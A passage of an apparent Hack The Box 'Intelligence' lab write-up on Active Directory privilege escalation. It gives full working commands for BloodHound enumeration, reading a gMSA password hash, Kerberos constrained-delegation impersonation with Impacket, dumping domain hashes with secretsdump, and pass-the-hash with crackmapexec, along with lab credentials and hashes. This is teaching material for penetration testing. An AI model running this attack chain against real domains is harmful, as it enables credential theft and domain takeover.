+<p>After obtaining <code>ted.graves</code> credentials lets run <code>BloodHound</code> to enumerate the Domain Controller, in order to find any path to Domain Admin. </p>
+<p>We can use <code>bloodhound-python</code> in Kali, but I prefer to use the Windows Powershell version because it give us more accurate results. </p>
+<blockquote>
+<p>To use <code>bloodhound-python</code> use the following command: </p>
+<p><code>bash
+bloodhound-python -u 'ted.graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb -c all  --dns-tcp</code></p>
+<p>But it will not give you all attack paths.  </p>
+</blockquote>
+<p><img alt="" src="../assets/image-20210704130313909.png" /></p>
+<p>BloodHound gave us a new attack path into Domain Admin. <code>ted.graves</code> is member of <code>IT Support</code> group, which all members of <code>IT Support</code> group can read <code>gMSAPassword</code> of <code>SVC_INT</code> domain user. <code>SVC_INT</code> is allowed to delegate into the Domain Controller. </p>
+<p>With this known now we can compromise the Domain Controller by chaining two attack paths: </p>
+<p><strong>1- Reading <code>gMSAPassword</code> of the domain user <code>SVC_INT</code>.</strong> </p>
+<p><em>Further Reading</em>: <a href="https://stealthbits.com/blog/securing-gmsa-passwords/">https://stealthbits.com/blog/securing-gmsa-passwords/</a></p>
+<p><strong>2- Constrained Delegation.</strong> </p>
+<p><em>Further Reading:</em> <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation</a></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="abuse-gmsa-password">Abuse gMSA Password</h3>
+<p>Again we can use Kali or Windows to abuse this misconfiguration. I used Windows to obtain <code>SVC_INT</code> NTLM hash using the following command: </p>
+<pre><code class="language-c#">$gmsa = Get-ADServiceAccount -Identity 'SVC_INT' -Properties 'msDS-ManagedPassword' -Server 10.10.10.248
+$blob = $gmsa.'msDS-ManagedPassword'
+$mp = ConvertFrom-ADManagedPasswordBlob $blob
+$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
+</code></pre>
+<p>Or from Kali Linux we can use <code>gMSADumper</code> from this <a href="https://github.com/micahvandeusen/gMSADumper">link</a></p>
+<pre><code class="language-bash">python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb 
+svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
+</code></pre>
+<p>We found domain user <code>SVC_INT</code> NTLM hash which is <code>d64b83fe606e6d3005e20ce0ee932fe2</code> </p>
+<h3 id="abuse-constrained-delegation">Abuse Constrained Delegation</h3>
+<p>First of all, we need to find which service that <code>SVC_INT</code> can access. We can use <code>rpcclient</code> from Kali or <code>Get-DomainComputer</code> from <code>PowerView</code> module. </p>
+<p>I found that the domain user <code>SVC_INT</code> can access the service <code>www/dc.intelligence.htb</code>. </p>
+<p>Now we have service which we can abuse to request a Kerberos tickets to exploit delegation configuration. We can use Impackets <code>getST.py</code> to impersonate the administrator by passing flag <code>-impersonate</code>. </p>
+<pre><code class="language-bash">getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
+Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+</code></pre>
+<blockquote>
+<p>Before running the command make sure Kali time is sync with the target machine. </p>
+<p><code>bash
+sudo ntpdate 10.10.10.248</code></p>
+</blockquote>
+<p>Obtaining administrator tickets will allow us to have full administrator privilege in the Domain Controller, we can pass the tickets to dump all domain controller NTLM hashes. But before that we have to store the into the variable <code>KRB4CCNAME</code>:</p>
+<pre><code class="language-bash">export KRB5CCNAME=Administrator.ccache   
+</code></pre>
+<p>Finally, I used Impacket tool <code>secretdumps.py</code> to dump all domain users hashes including the Domain Admin. </p>
+<pre><code class="language-bash">secretsdump.py -k -no-pass dc.intelligence.htb
+</code></pre>
+<p><img alt="" src="../assets/image-20210705190529721.png" /></p>
+<p>We will find the NTLM hash of the Domain Admin.  </p>
+<p><img alt="" src="../assets/image-20210705190506538.png" /></p>
+<p><img alt="" src="../assets/image-20210705190605625.png" /></p>
+<p>We can use Domain Admin NTLM hash as pass the hash to read <code>root.txt</code> flag using <code>crackmapexec</code> </p>
+<p><img alt="" src="../assets/image-20210705190812320.png" /></p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.248 -u administrator -H '9075113fe16cf74f7c0f9b27e882dad3' -x 'more C:\users\administrator\desktop\root.txt'
+</code></pre>
+<h1 id="lesson-learned">Lesson Learned</h1>
+<ol>
+<li>Enumerating PDF documents to find users. </li>
+<li>NTLM relay attacks.</li>
+<li>Abuse gMSA Password</li>
+<li>Abuse Constrained Delegation</li>
+</ol>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../../Posts/Create_Pentest_Report_using_Markdown/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Creating a Professional Penetration Test Report using Markdown and Pandoc" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Creating a Professional Penetration Test Report using Markdown and Pandoc
+            </div>
+          </div>
+        </a>
+      
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        
+          Made with
+          <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+            Material for MkDocs
+          </a>
+        
+        
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.8397ff9e.min.js", "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.1e84347e.min.js"></script>
+      
+    
+  </body>
+</html>
